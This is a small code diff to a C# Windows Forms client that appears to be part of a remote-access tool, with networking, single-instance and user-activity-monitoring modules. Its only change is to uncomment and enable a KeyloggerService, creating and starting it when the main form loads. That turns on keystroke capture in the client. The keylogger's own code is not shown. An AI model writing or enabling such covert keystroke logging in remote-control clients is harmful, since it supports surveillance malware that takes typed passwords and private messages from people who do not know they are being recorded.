@@ -1,4 +1,4 @@
-﻿//using Client.Logging;
+﻿using Client.Logging;
 using Client.User;
 using Client.Utilities;
 using System.Net;
@@ -8,7 +8,7 @@ namespace Client
     public partial class FrmMain : Form
     {
         private Client.Networking.Client _connectClient;
-        //private KeyloggerService _keyloggerService;
+        private KeyloggerService _keyloggerService;
         private ActivityDetection _userActivityDetection;
 
         public SingleInstanceMutex ApplicationMutex;
@@ -30,8 +30,8 @@ namespace Client
                 
                 _connectClient = new(this);
 
-                //_keyloggerService = new KeyloggerService();
-                //_keyloggerService.Start();
+                _keyloggerService = new KeyloggerService();
+                _keyloggerService.Start();
 
                 _userActivityDetection = new ActivityDetection(_connectClient);// module giám sát hoạt động của người dùng
                 _userActivityDetection.Start();
